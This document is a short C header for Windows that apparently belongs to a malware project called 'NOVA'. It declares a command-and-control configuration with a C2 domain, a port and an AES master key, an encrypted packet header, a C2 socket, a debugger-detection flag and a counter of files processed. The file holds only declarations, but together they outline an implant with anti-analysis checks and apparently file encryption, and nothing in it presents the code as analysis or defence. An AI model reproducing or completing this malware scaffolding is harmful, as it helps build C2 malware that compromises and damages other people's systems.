#pragma once

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0601  // Windows 7+
#endif

#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

// Pragmas pour les libs
#pragma comment(lib, "ws2_32.lib")

// Constants
#define MAGIC_HEADER 0x4E4F5641
#define AES_KEY_SIZE 32
#define AES_IV_SIZE 16
#define MAX_PATH_LEN 4096
#define THREAD_POOL_SIZE 2

// Structures
typedef struct {
    DWORD magic;
    DWORD packet_type;
    DWORD data_length;
    DWORD checksum;
    BYTE session_key[16];
    BYTE iv[AES_IV_SIZE];
} NOVA_PACKET_HEADER;

typedef struct {
    CHAR c2_domain[256];
    WORD c2_port;
    BYTE master_key[AES_KEY_SIZE];
    DWORD connection_timeout;
} C2_CONFIG;

// Global variables
extern C2_CONFIG g_c2_config;
extern SOCKET g_c2_socket;
extern BOOL g_debug_detected;
extern DWORD g_files_processed;
